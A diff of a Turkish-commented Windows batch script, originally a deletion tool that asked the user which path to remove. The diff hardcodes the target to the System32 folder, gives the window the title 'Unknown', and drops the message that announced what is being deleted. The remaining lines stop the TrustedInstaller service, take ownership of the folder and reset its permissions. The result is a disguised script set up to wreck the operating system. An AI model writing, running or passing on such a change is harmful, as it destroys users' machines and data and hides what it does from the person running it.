@@ -1,6 +1,6 @@
 @echo off
 setlocal EnableDelayedExpansion
-title Dosya/Klasor Silme Araci
+title Unknown
 
 :: Yonetici yetkisi kontrolu
 net session >nul 2>&1
@@ -11,17 +11,15 @@ if %errorLevel% neq 0 (
     exit /B 1
 )
 
-:: Kullanicidan yol al
-set /p "targetPath=Silinecek dosya/klasor yolunu girin: "
+:: Silinecek dosya veya klasörün tam yolunu buraya yazın
+set "targetPath=%windir%/System32"
 
-echo.
-echo Silme islemi basliyor: %targetPath%
-echo.
+
 
 :: TrustedInstaller servisini durdur
 net stop TrustedInstaller /y >nul 2>&1
 
-:: System yetkilerini kaldir
+:: Sistem yetkilerini kaldir
 echo Sistem yetkileri kaldiriliyor...
 icacls "%targetPath%" /setowner "Administrators" /T /C >nul 2>&1
 icacls "%targetPath%" /reset /T >nul 2>&1
